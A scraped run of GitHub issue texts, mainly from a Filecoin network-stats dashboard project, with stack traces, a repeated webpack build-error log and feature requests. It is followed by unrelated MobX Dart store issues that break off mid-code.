    at /home/filecoin/codes/filecoin-network-stats/backend/node_modules/db-migrate/lib/commands/on-complete.js:15:14
    at tryCatcher (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/util.js:16:23)
    at Promise.successAdapter (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/nodeify.js:22:30)
    at Promise._settlePromise (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/promise.js:566:21)
    at Promise._settlePromiseCtx (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/promise.js:606:10)
    at _drainQueueStep (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:142:12)
    at _drainQueue (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:131:9)
    at Async._drainQueues (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:147:5)
    at Immediate.Async.drainQueues [as _onImmediate] (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:17:14)
    at runCallback (timers.js:705:18)
    at tryOnImmediate (timers.js:676:5)
    at processImmediate (timers.js:658:5)

```  Doesn't have to include the entire Best Tipset component.

Just the Block Height number - because it's the most important number for miners - everyone is constantly looking at it to see if they're synced. - db-migrate up  failed
```
$ DATABASE_URL=postgres://postgres:xxx@1@localhost:5432/filecoin-network-stats db-migrate   up

received data: CREATE INDEX block_height_idx ON blocks USING btree(height);
[INFO] Processed migration 20190606073105-add-block-height-index
[ERROR] AssertionError [ERR_ASSERTION]: ifError got unwanted exception: ENOENT: no such file or directory, open '/home/filecoin/codes/filecoin-network-stats/backend/migrations/sqls/20190608002923-update-trigger-param-type-up.sql'
    at /home/filecoin/codes/filecoin-network-stats/backend/node_modules/db-migrate/lib/commands/on-complete.js:15:14
    at tryCatcher (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/util.js:16:23)
    at Promise.successAdapter (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/nodeify.js:22:30)
    at Promise._settlePromise (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/promise.js:566:21)
    at Promise._settlePromiseCtx (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/promise.js:606:10)
    at _drainQueueStep (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:142:12)
    at _drainQueue (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:131:9)
    at Async._drainQueues (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:147:5)
    at Immediate.Async.drainQueues [as _onImmediate] (/home/filecoin/codes/filecoin-network-stats/backend/node_modules/bluebird/js/release/async.js:17:14)
    at runCallback (timers.js:705:18)
    at tryOnImmediate (timers.js:676:5)
    at processImmediate (timers.js:658:5)

```  Currently the dashboard counts *any* node that connects to it, regardless of network or version. The result is an misleading count of participating nodes.

Let’s check genesisCID in heartbeat messages (will have to be added via https://github.com/filecoin-project/go-filecoin/issues/2982). Then the stats dashboard could reject connections from nodes that are no longer on the correct network.

Based on chat discussion w/ @mslipper @frrist.  This is a placeholder issue for necessary updates due to changes to block datastructure in https://github.com/filecoin-project/go-filecoin/pull/3185. Installing and building for local development needs improvement.  There should be some instructions on running postgres and making it clear that it is required to build from the common directory for the backend to build.  

There should be a single command that builds everything and another that starts everything other than the data base and the filecoin node. uBlock Origin uses the easylist.to block lists which now contains an entry for `browser.sentry-cdn.com`. This results in a failure to load the sentry bundle and the page immediately fails with `TypeError: window.Sentry is undefined`.

A simple check should resolve the issue.

https://github.com/filecoin-project/filecoin-network-stats/blob/abd016883ca12e01868a29706ed9549875b6a904/frontend/src/index.tsx#L21-L23

https://easylist.to/easylist/easyprivacy.txt ### Description
My node IP address is in Shanghai, China, but it is displayed in Japan, and other node locations seem to be wrong.
### node
/ip4/122.144.208.16/tcp/6000/ipfs/QmSZ4CQdCWwLFD8ngq4QE8N2bvEsA5inv7u211rr52axFt
/ip4/122.144.208.36/tcp/6000/ipfs/QmWQK4Xww2xjumWCjEtXuXEaEVaCQe9P1LiqpL1aQbYY7t
/ip4/122.144.208.36/tcp/6003/ipfs/QmR1fL9Hpg8oAAZFkjN7YcPJ4W1ptRigpN32mfEZ9epNM3
### screenshot
![TIM图片20190810151421](https://user-images.githubusercontent.com/50695407/62818978-9070d600-bb81-11e9-813e-2ac471445d1a.png)

### Protocol Changes

### Where to begin
 _[To ask go-filecoin team]_

There was a request to add a link to a doc of Known Issues with the current network to the Dashboard. Should [KNOWN_ISSUES.md](https://github.com/filecoin-project/go-filecoin/blob/master/KNOWN_ISSUES.md) be that doc?

<img width="873" alt="Screen Shot 2019-07-22 at 6 49 11 PM" src="https://user-images.githubusercontent.com/1017762/61650021-fe2c8f00-acb2-11e9-961e-5e516a456fe7.png">

(Also FYI - current Devnet version is being loaded from [go-filecoin-badge/user-devnet.json](https://github.com/filecoin-project/go-filecoin-badges) if Network.STABLE. These links can be moved later when there are other implementations.) _[To ask go-filecoin team]_

There was a request to add a link to a Known Issues [with the current network] doc to the Dashboard. Should [KNOWN_ISSUES.md](https://github.com/filecoin-project/go-filecoin/blob/master/KNOWN_ISSUES.md) be that doc?

<img width="873" alt="Screen Shot 2019-07-22 at 6 49 11 PM" src="https://user-images.githubusercontent.com/1017762/61650021-fe2c8f00-acb2-11e9-961e-5e516a456fe7.png">

(Also FYI - current Devnet version is being loaded from [go-filecoin-badge/user-devnet.json](https://github.com/filecoin-project/go-filecoin-badges) if Network.STABLE) Doesn't have to include the entire Best Tipset component.

Just the Block Height number - because it's the most important number for miners - everyone is constantly looking at it to see if they're synced. project: frontend
----------------------
npm install
----------------------
npm WARN optional Skipping failed optional dependency /chokidar/fsevents:
npm WARN notsup Not compatible with your operating system or architecture: fsevents@1.2.7
npm WARN filecoin-network-stats-frontend@0.0.0 No description
npm WARN filecoin-network-stats-frontend@0.0.0 No repository field.

----------------------
npm run dev
----------------------
[0] multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx 52 bytes {main} [built]
[./node_modules/c3/c3.css] 1020 bytes {main} [built]
[./node_modules/loglevel/lib/loglevel.js] 7.68 KiB {main} [built]
[./node_modules/normalize.css/normalize.css] 1.02 KiB {main} [built]
[./node_modules/react-dom/index.js] 1.33 KiB {main} [built]
[./node_modules/react-redux/es/index.js] 270 bytes {main} [built]
[./node_modules/react-router-dom/es/index.js] 1010 bytes {main} [built]
[./node_modules/react/index.js] 190 bytes {main} [built]
[./node_modules/strip-ansi/index.js] 161 bytes {main} [built]
[./node_modules/url/url.js] 22.8 KiB {main} [built]
[./node_modules/webpack-dev-server/client/index.js?http://localhost:8081] (webpack)-dev-server/client?http://localhost:8081 7.78 KiB {main} [built]
[./node_modules/webpack-dev-server/client/overlay.js] (webpack)-dev-server/client/overlay.js 3.58 KiB {main} [built]
[./node_modules/webpack-dev-server/client/socket.js] (webpack)-dev-server/client/socket.js 1.05 KiB {main} [built]
[./node_modules/webpack/hot/dev-server.js] (webpack)/hot/dev-server.js 1.61 KiB {main} [built]
[./src/index.tsx] 1020 bytes {main} [built]
    + 505 hidden modules

WARNING in EnvironmentPlugin - GA_TRACKING_ID environment variable is undefined.

You can pass an object with default values to suppress this warning.
See https://webpack.js.org/plugins/environment-plugin for example.

WARNING in EnvironmentPlugin - SENTRY_DSN environment variable is undefined.

You can pass an object with default values to suppress this warning.
See https://webpack.js.org/plugins/environment-plugin for example.

ERROR in ./src/ducks/overrides.ts
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/CategoryDatapoint' in '/file/data/wwwroot/filecoin/frontend/src/ducks'
 @ ./src/ducks/overrides.ts 50:26-95
 @ ./src/ducks/store.ts
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in ./src/components/DateSwitchingChart.tsx
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/ChartDuration' in '/file/data/wwwroot/filecoin/frontend/src/components'
 @ ./src/components/DateSwitchingChart.tsx 53:22-87
 @ ./src/components/storage/HistoricalUtilizationChart.tsx
 @ ./src/components/storage/StorageCostCapacity.tsx
 @ ./src/components/Main.tsx
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in ./src/ducks/stats.ts
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/Stats' in '/file/data/wwwroot/filecoin/frontend/src/ducks'
 @ ./src/ducks/stats.ts 50:14-71
 @ ./src/ducks/store.ts
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in ./src/ducks/overrides.ts
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint' in '/file/data/wwwroot/filecoin/frontend/src/ducks'
 @ ./src/ducks/overrides.ts 49:28-99
 @ ./src/ducks/store.ts
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in [at-loader] ./src/ducks/stats.ts:4:47 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Stats'.

ERROR in [at-loader] ./src/ducks/overrides.ts:2:89 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/ducks/overrides.ts:3:83 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/ducks/overrides.ts:4:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/MiningSummary.tsx:8:27 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Stats'.

ERROR in [at-loader] ./src/components/NodeMap.tsx:7:20 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Node'.

ERROR in [at-loader] ./src/components/TimelineDateChart.tsx:6:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/utils/averages.ts:2:36 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/utils/averages.ts:3:37 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/utils/timeseriesUnits.ts:1:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/AverageStorageCostChart.tsx:3:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/GainLossTimelineChart.tsx:6:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/DateSwitchingChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/SwitchableDateSwitchingChart.tsx:6:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/Home.tsx:9:41 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Stats'.

ERROR in [at-loader] ./src/components/Home.tsx:25:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/Retrieval.tsx:8:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:2:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:48:17 
    TS2339: Property 'count' does not exist on type 'AugmentedHistogramDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:49:21 
    TS2339: Property 'count' does not exist on type 'AugmentedHistogramDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:54:17 
    TS2339: Property 'count' does not exist on type 'AugmentedHistogramDatapoint'.

ERROR in [at-loader] ./src/components/token/TokenHoldingsDistribution.tsx:2:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/token/HistoricalCollateralChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/token/HistoricalCollateralChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/token/HistoricalBlockRewards.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/token/HistoricalBlockRewards.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/StackedColumnChart.tsx:2:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/token/CoinsInCirculation.tsx:2:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/token/CoinsInCirculation.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/token/BlockRewardLifecycle.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/MinerCountChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/MinerCountChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/storage/StorageMinersTable.tsx:5:25 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/MinerStat'.

ERROR in [at-loader] ./src/components/PercentageLineChart.tsx:2:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/storage/MiningEvolutionChart.tsx:5:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/utils/randomData.ts:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/utils/randomData.ts:3:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/storage/StorageDeals.tsx:7:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/storage/StorageCapacityHistogram.tsx:2:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalCollateralPerGBChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalCollateralPerGBChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/storage/StorageCostCapacityBySizeBreakdown.tsx:2:40 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CostCapacityForMinerStat'.

ERROR in [at-loader] ./src/components/storage/HistoricalStoragePriceChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalStoragePriceChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/storage/HistoricalUtilizationChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalUtilizationChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.
Child html-webpack-plugin for "index.html":
     1 asset
    Entrypoint undefined = index.html
    [./node_modules/html-webpack-plugin/lib/loader.js!./src/index.html] 2.7 KiB {0} [built]
    [./node_modules/lodash/lodash.js] 527 KiB {0} [built]
    [./node_modules/webpack/buildin/global.js] (webpack)/buildin/global.js 472 bytes {0} [built]
    [./node_modules/webpack/buildin/module.js] (webpack)/buildin/module.js 497 bytes {0} [built]
ℹ ｢wdm｣: Failed to compile. project: frontend
----------------------
npm install
----------------------
npm WARN optional Skipping failed optional dependency /chokidar/fsevents:
npm WARN notsup Not compatible with your operating system or architecture: fsevents@1.2.7
npm WARN filecoin-network-stats-frontend@0.0.0 No description
npm WARN filecoin-network-stats-frontend@0.0.0 No repository field.

----------------------
npm run dev
----------------------
[0] multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx 52 bytes {main} [built]
[./node_modules/c3/c3.css] 1020 bytes {main} [built]
[./node_modules/loglevel/lib/loglevel.js] 7.68 KiB {main} [built]
[./node_modules/normalize.css/normalize.css] 1.02 KiB {main} [built]
[./node_modules/react-dom/index.js] 1.33 KiB {main} [built]
[./node_modules/react-redux/es/index.js] 270 bytes {main} [built]
[./node_modules/react-router-dom/es/index.js] 1010 bytes {main} [built]
[./node_modules/react/index.js] 190 bytes {main} [built]
[./node_modules/strip-ansi/index.js] 161 bytes {main} [built]
[./node_modules/url/url.js] 22.8 KiB {main} [built]
[./node_modules/webpack-dev-server/client/index.js?http://localhost:8081] (webpack)-dev-server/client?http://localhost:8081 7.78 KiB {main} [built]
[./node_modules/webpack-dev-server/client/overlay.js] (webpack)-dev-server/client/overlay.js 3.58 KiB {main} [built]
[./node_modules/webpack-dev-server/client/socket.js] (webpack)-dev-server/client/socket.js 1.05 KiB {main} [built]
[./node_modules/webpack/hot/dev-server.js] (webpack)/hot/dev-server.js 1.61 KiB {main} [built]
[./src/index.tsx] 1020 bytes {main} [built]
    + 505 hidden modules

WARNING in EnvironmentPlugin - GA_TRACKING_ID environment variable is undefined.

You can pass an object with default values to suppress this warning.
See https://webpack.js.org/plugins/environment-plugin for example.

WARNING in EnvironmentPlugin - SENTRY_DSN environment variable is undefined.

You can pass an object with default values to suppress this warning.
See https://webpack.js.org/plugins/environment-plugin for example.

ERROR in ./src/ducks/overrides.ts
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/CategoryDatapoint' in '/file/data/wwwroot/filecoin/frontend/src/ducks'
 @ ./src/ducks/overrides.ts 50:26-95
 @ ./src/ducks/store.ts
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in ./src/components/DateSwitchingChart.tsx
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/ChartDuration' in '/file/data/wwwroot/filecoin/frontend/src/components'
 @ ./src/components/DateSwitchingChart.tsx 53:22-87
 @ ./src/components/storage/HistoricalUtilizationChart.tsx
 @ ./src/components/storage/StorageCostCapacity.tsx
 @ ./src/components/Main.tsx
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in ./src/ducks/stats.ts
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/Stats' in '/file/data/wwwroot/filecoin/frontend/src/ducks'
 @ ./src/ducks/stats.ts 50:14-71
 @ ./src/ducks/store.ts
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in ./src/ducks/overrides.ts
Module not found: Error: Can't resolve 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint' in '/file/data/wwwroot/filecoin/frontend/src/ducks'
 @ ./src/ducks/overrides.ts 49:28-99
 @ ./src/ducks/store.ts
 @ ./src/index.tsx
 @ multi (webpack)-dev-server/client?http://localhost:8081 (webpack)/hot/dev-server.js ./src/index.tsx

ERROR in [at-loader] ./src/ducks/stats.ts:4:47 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Stats'.

ERROR in [at-loader] ./src/ducks/overrides.ts:2:89 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/ducks/overrides.ts:3:83 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/ducks/overrides.ts:4:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/MiningSummary.tsx:8:27 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Stats'.

ERROR in [at-loader] ./src/components/NodeMap.tsx:7:20 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Node'.

ERROR in [at-loader] ./src/components/TimelineDateChart.tsx:6:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/utils/averages.ts:2:36 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/utils/averages.ts:3:37 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/utils/timeseriesUnits.ts:1:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/AverageStorageCostChart.tsx:3:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/GainLossTimelineChart.tsx:6:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/DateSwitchingChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/SwitchableDateSwitchingChart.tsx:6:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/Home.tsx:9:41 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/Stats'.

ERROR in [at-loader] ./src/components/Home.tsx:25:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/Retrieval.tsx:8:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:2:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:48:17 
    TS2339: Property 'count' does not exist on type 'AugmentedHistogramDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:49:21 
    TS2339: Property 'count' does not exist on type 'AugmentedHistogramDatapoint'.

ERROR in [at-loader] ./src/components/HistogramChart.tsx:54:17 
    TS2339: Property 'count' does not exist on type 'AugmentedHistogramDatapoint'.

ERROR in [at-loader] ./src/components/token/TokenHoldingsDistribution.tsx:2:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/token/HistoricalCollateralChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/token/HistoricalCollateralChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/token/HistoricalBlockRewards.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/token/HistoricalBlockRewards.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/StackedColumnChart.tsx:2:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/token/CoinsInCirculation.tsx:2:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/token/CoinsInCirculation.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/token/BlockRewardLifecycle.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/MinerCountChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/MinerCountChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/storage/StorageMinersTable.tsx:5:25 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/MinerStat'.

ERROR in [at-loader] ./src/components/PercentageLineChart.tsx:2:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/storage/MiningEvolutionChart.tsx:5:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/utils/randomData.ts:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/utils/randomData.ts:3:33 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CategoryDatapoint'.

ERROR in [at-loader] ./src/components/storage/StorageDeals.tsx:7:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/storage/StorageCapacityHistogram.tsx:2:34 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/HistogramDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalCollateralPerGBChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalCollateralPerGBChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/storage/StorageCostCapacityBySizeBreakdown.tsx:2:40 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/CostCapacityForMinerStat'.

ERROR in [at-loader] ./src/components/storage/HistoricalStoragePriceChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalStoragePriceChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.

ERROR in [at-loader] ./src/components/storage/HistoricalUtilizationChart.tsx:2:35 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/TimeseriesDatapoint'.

ERROR in [at-loader] ./src/components/storage/HistoricalUtilizationChart.tsx:3:29 
    TS2307: Cannot find module 'filecoin-network-stats-common/lib/domain/ChartDuration'.
Child html-webpack-plugin for "index.html":
     1 asset
    Entrypoint undefined = index.html
    [./node_modules/html-webpack-plugin/lib/loader.js!./src/index.html] 2.7 KiB {0} [built]
    [./node_modules/lodash/lodash.js] 527 KiB {0} [built]
    [./node_modules/webpack/buildin/global.js] (webpack)/buildin/global.js 472 bytes {0} [built]
    [./node_modules/webpack/buildin/module.js] (webpack)/buildin/module.js 497 bytes {0} [built]
ℹ ｢wdm｣: Failed to compile. https://stats.kittyhawk.wtf/ show like this:
![image](https://user-images.githubusercontent.com/9821227/70300258-01738200-1832-11ea-92e4-68d9fa5e2f8f.png)

https://docs.filecoin.io/go-filecoin-tutorial/Block-Explorer  show like this:
![image](https://user-images.githubusercontent.com/9821227/70300302-1fd97d80-1832-11ea-8ff1-c704978de100.png)



<---------->
162115321
I propose to create live templates to facilitate the creation of a store with a skeleton of the store.

```dart
part 'store.g.dart';

class Store = _Store with _$Store;

abstract class _Store with Store {
  @observable
  int value = 0;

  @action
  void increment() {
    value++;
  }
}
```

```xml
<template name="str" value="part '$NAME$.g.dart';&#10;&#10;class $NAMECAPITALIZE$ = _$NAMECAPITALIZE$ with _$$$NAMECAPITALIZE$;&#10;&#10;abstract class _$NAMECAPITALIZE$ with Store {&#10;  @observable&#10;  int value = 0;&#10;&#10;  @action&#10;  void increment() {&#10;    value++;&#10;  }&#10;}" description="Mobx Store" toReformat="true" toShortenFQNames="true">
  <variable name="NAME" expression="" defaultValue="&quot;store&quot;" alwaysStopAt="true" />
  <variable name="NAMECAPITALIZE" expression="capitalize(NAME)" defaultValue="&quot;Store&quot;" alwaysStopAt="true" />
  <context>
    <option name="DART" value="true" />
  </context>
</template>
``` I am new to mobx, and I try to make a countdown store with mobx 👇

```

import 'dart:async';

import 'package:mobx/mobx.dart';

part 'count_down_store.g.dart';

class CountDownStore = CountDownStoreBase with _$CountDownStore;

abstract class CountDownStoreBase with Store {
  CountDownStoreBase(this._totalSeconds);

  @observable
  int current = 3;

  int _totalSeconds;

  @action
  bool shouldReset = false;
